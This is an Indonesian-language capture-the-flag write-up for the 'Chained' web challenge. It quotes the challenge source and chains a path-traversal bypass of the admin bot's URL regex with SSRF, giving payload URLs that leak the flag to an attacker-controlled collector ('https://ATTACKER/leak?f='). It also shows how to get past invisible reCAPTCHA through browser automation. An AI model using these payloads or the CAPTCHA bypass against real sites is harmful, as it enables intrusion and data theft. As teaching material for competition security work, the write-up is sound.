# Chained

## Flag

`tjctf{ch41n3d_o340e934l35d}`

## Ringkasan ide

Challenge ini kelihatannya seperti admin bot biasa, tapi ternyata ada rantai bug yang nyambung:

1. Halaman utama menerima parameter `url` dan server akan melakukan `requests.get(url)`.
2. Hasil response dari URL itu dimasukkan ke template dengan `{{ q | safe }}`.
3. Endpoint `/admin` cuma bisa diakses dari `127.0.0.1`, jadi ini jelas target SSRF.
4. Admin bot hanya mau mengunjungi URL yang cocok dengan regex `^https://chained\.tjc\.tf\/admin\/`.
5. Bot lalu melakukan `page.goto(url + flag)`, jadi flag ditempel langsung ke belakang URL yang kita submit.

Kunci exploit-nya adalah membuat URL yang:

- tetap lolos regex bot karena diawali `/admin/`
- tapi setelah dinormalisasi browser, justru pindah ke `/`
- dan flag yang ditempel bot ikut masuk sebagai bagian dari query string

## Analisis source

Di `app.py` ada dua bagian penting:

```python
def isSafe(url):
    blacklist={'127', 'local', '2130706433', '017700000001', '::1', '0.0.0.0', '[::]', 'ffff', '0.0.0.0', '0x', '..', '%2e%2e', '@'}
    return all([i not in url.lower() for i in blacklist])
```

Blacklist ini hanya dipakai saat kita submit form `/`. Artinya kalau request datang langsung ke endpoint GET `/` dengan query string buatan kita, validasi itu sama sekali tidak jalan.

Lalu bagian SSRF:

```python
url = request.args.get('url') or ''
if url:
    req = 'Your response: ' + requests.get(url).text
```

Jadi kalau kita bisa mengarahkan browser admin ke:

```text
https://chained.tjc.tf/?url=https://attacker.tld/leak?f=FLAG
```

server challenge akan melakukan request ke server kita dan flag bocor lewat query string.

Di `admin-bot.js`:

```javascript
urlRegex: /^https:\/\/chained\.tjc\.tf\/admin\//,
handler: async (url, ctx) => {
    const page = await ctx.newPage();
    await page.goto(url + flag, { timeout: 3000, waitUntil: 'domcontentloaded' });
}
```

Regex hanya memeriksa prefix string mentah. Browser sendiri akan menormalisasi path seperti `/admin/../` menjadi `/`.

Jadi payload utamanya:

```text
https://chained.tjc.tf/admin/../?url=https://ATTACKER/leak?f=
```

Setelah bot menempelkan flag, URL final menjadi:

```text
https://chained.tjc.tf/admin/../?url=https://ATTACKER/leak?f=tjctf{...}
```

Saat dinormalisasi browser, request aktual menuju:

```text
https://chained.tjc.tf/?url=https://ATTACKER/leak?f=tjctf{...}
```

Lalu server challenge menjalankan SSRF ke endpoint kita:

```text
https://ATTACKER/leak?f=tjctf{...}
```

Di situlah flag jatuh.

## Bypass reCAPTCHA

Form admin bot memakai reCAPTCHA invisible. Tidak perlu solve manual. Dari browser automation, token bisa diambil langsung dengan:

```javascript
grecaptcha.execute(0)
```

Token itu lalu dipakai untuk POST ke admin bot.

## Langkah exploit

1. Jalankan HTTP collector lokal untuk menerima request SSRF.
2. Buka quick tunnel dengan `cloudflared` supaya collector bisa diakses dari internet.
3. Ambil token reCAPTCHA dari halaman admin bot memakai Playwright.
4. Submit payload traversal:

```text
https://chained.tjc.tf/admin/../?url=https://<tunnel>/leak?f=
```

5. Tunggu sampai bot mengunjungi URL tersebut.
6. Server challenge melakukan SSRF ke collector kita dengan query `f=<flag>`.
7. Ambil flag dari request yang masuk.

## Solver

Solver otomatis ada di [solve.py](/home/nata/ctf/tjcsc/web/chained/solve.py).

Jalankan:

```bash
source /home/nata/ctf_env/bin/activate
python solve.py
```

Solver akan:

- menyalakan collector di `127.0.0.1:8000`
- membuat tunnel `trycloudflare`
- mengambil token reCAPTCHA
- submit payload ke bot
- menunggu request SSRF yang membawa flag

## Kenapa chain ini berhasil

Masalah utamanya bukan satu bug tunggal, tapi gabungan beberapa asumsi yang salah:

- regex bot hanya memeriksa string awal, bukan URL setelah normalisasi
- `/admin` dibatasi berdasarkan IP, tapi endpoint utama punya SSRF
- validasi blacklist hanya ada di alur POST form, bukan di alur GET yang dipakai payload akhir
- bot menempelkan flag langsung ke URL tanpa encoding atau pemisahan yang aman

Kalau salah satu bagian ini dibenerin, exploit-nya runtuh. Tapi karena semuanya tersambung, jadinya flag bisa dipantulkan keluar dengan cukup rapi.
